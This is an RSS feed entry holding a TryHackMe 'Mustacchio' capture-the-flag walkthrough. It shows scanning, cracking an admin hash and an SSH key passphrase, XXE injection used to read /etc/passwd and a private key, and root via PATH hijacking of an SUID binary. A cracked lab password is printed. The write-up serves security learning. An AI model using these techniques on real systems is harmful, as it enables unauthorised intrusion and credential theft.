@@ -1,0 +1,136 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>TryHackMe on Ally Petitt</title>
+    <link>http://localhost:1313/ally-petitt/tags/tryhackme/</link>
+    <description>Recent content in TryHackMe on Ally Petitt</description>
+    <generator>Hugo -- 0.125.4</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 18 Feb 2022 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/ally-petitt/tags/tryhackme/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Mustacchio Walkthrough | Try Hack Me | Ally Petitt</title>
+      <link>http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</link>
+      <pubDate>Fri, 18 Feb 2022 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</guid>
+      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;introduction&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!&lt;/p&gt;
+&lt;p&gt;Notes: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;enumeration&#34;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;To begin, I scanned for open ports using &lt;a href=&#34;https://github.com/RustScan/RustScan&#34;&gt;RustScan&lt;/a&gt;. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;FFUF&lt;/a&gt; (you can also use Wfuzz, Gobuster, or DirBuster for this part).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ffuf -u &amp;lt;http://10.10.93.193/FUZZ&amp;gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png&#34; alt=&#34;&#34;  /&gt;
+
+The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png&#34; alt=&#34;&#34;  /&gt;
+
+And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png&#34; alt=&#34;&#34;  /&gt;
+
+How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.&lt;/p&gt;
+&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&amp;gt; .tables   users   sqlite&amp;gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png&#34; alt=&#34;&#34;  /&gt;
+
+And we have our password! With the newfound credentials &lt;code&gt;admin:bulldog19&lt;/code&gt; I logged into the admin console on port 8765. Success! The credentials worked.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png&#34; alt=&#34;&#34;  /&gt;
+
+While looking at the page source, two things immediately stand out to me.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;I see a comment left by the developer&lt;/li&gt;
+&lt;li&gt;The name of the input box is “xml”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png&#34; alt=&#34;&#34;  /&gt;
+
+When I try press submit without writing anything in the textarea, I am greeted by the following alert:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png&#34; alt=&#34;&#34;  /&gt;
+
+Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the &lt;a href=&#34;https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870&#34;&gt;most common XML vulnerabilities&lt;/a&gt; is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this &lt;a href=&#34;https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/&#34;&gt;blog post&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;`&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;When I type this in the text area and press “Submit”, I see the following on my screen:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png&#34; alt=&#34;&#34;  /&gt;
+
+Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.&lt;/p&gt;
+&lt;h1 id=&#34;usertxt&#34;&gt;User.txt&lt;/h1&gt;
+&lt;p&gt;Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed &lt;code&gt;/etc/passwd&lt;/code&gt; to &lt;code&gt;/home/barry/.ssh/id_rsa&lt;/code&gt; as &amp;ldquo;id_rsa&amp;rdquo; is a common name for the file containing a private ssh key.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png&#34; alt=&#34;&#34;  /&gt;
+
+Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, &lt;strong&gt;making sure that there is no white space&lt;/strong&gt;. I changed the permissions on the file using this command:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;chmod 400 id_rsa_barry&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I went to ssh into the machine and this was my result:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png&#34; alt=&#34;&#34;  /&gt;
+
+It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ python3 /usr/share/john/ssh2john.py id_rsa_barry &amp;gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png&#34; alt=&#34;&#34;  /&gt;
+
+Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.&lt;/p&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png&#34; alt=&#34;&#34;  /&gt;
+
+Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;First, I took a look at Barry’s id.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;It appears that he is not in any groups that we could use for privilege escalation. I also used &lt;code&gt;sudo -l&lt;/code&gt; to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;barry@mustacchio:~$ find / -perm -4000 2&amp;gt;/dev/null  
+/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
+/usr/lib/eject/dmcrypt-get-device  
+/usr/lib/policykit-1/polkit-agent-helper-1  
+/usr/lib/snapd/snap-confine  
+/usr/lib/openssh/ssh-keysign  
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
+/usr/bin/passwd  
+/usr/bin/pkexec  
+/usr/bin/chfn  
+/usr/bin/newgrp  
+/usr/bin/at  
+/usr/bin/chsh  
+/usr/bin/newgidmap  
+/usr/bin/sudo  
+/usr/bin/newuidmap  
+/usr/bin/gpasswd  
+**/home/joe/live\_log**  
+/bin/ping  
+/bin/ping6  
+/bin/umount  
+/bin/mount  
+/bin/fusermount  
+/bin/su
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ cd /home/joe &amp;amp;&amp;amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And we do! When I run it, it appears to launch an application.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png&#34; alt=&#34;&#34;  /&gt;
+
+This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the &lt;code&gt;strings&lt;/code&gt; command. Additionally, I used &lt;code&gt;awk&lt;/code&gt; so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ strings live_log | awk ‘length($0) &amp;gt; 15’&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png&#34; alt=&#34;&#34;  /&gt;
+
+Interesting. There is a path to “access.log” and the full path for the &lt;code&gt;tail&lt;/code&gt; command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.&lt;/p&gt;
+&lt;p&gt;`$ export PATH=/tmp&lt;br&gt;
+$ cd /tmp&lt;br&gt;
+$ echo “/bin/bash -p” &amp;gt; tail&lt;br&gt;
+$ /bin/chmod +x tail&lt;br&gt;
+$ /home/joe/live_log&lt;/p&gt;
+&lt;h1 id=&#34;usrbinwhoami&#34;&gt;/usr/bin/whoami&lt;/h1&gt;
+&lt;p&gt;root&lt;/p&gt;
+&lt;h1 id=&#34;bincat-rootroottxt&#34;&gt;/bin/cat /root/root.txt&lt;/h1&gt;
+&lt;p&gt;[REDACTED]`&lt;/p&gt;
+&lt;p&gt;And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from &lt;code&gt;/usr/bin/tail&lt;/code&gt; to &lt;code&gt;/tmp/tail&lt;/code&gt; which allowed us to run &lt;code&gt;/bin/bash&lt;/code&gt; as root, giving us a root shell.&lt;/p&gt;
+&lt;p&gt;That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt-5a02aa208/&#34;&gt;via LinkedIn&lt;/a&gt;. Thank you and take care!&lt;/p&gt;
+</description>
+    </item>
+  </channel>
+</rss>
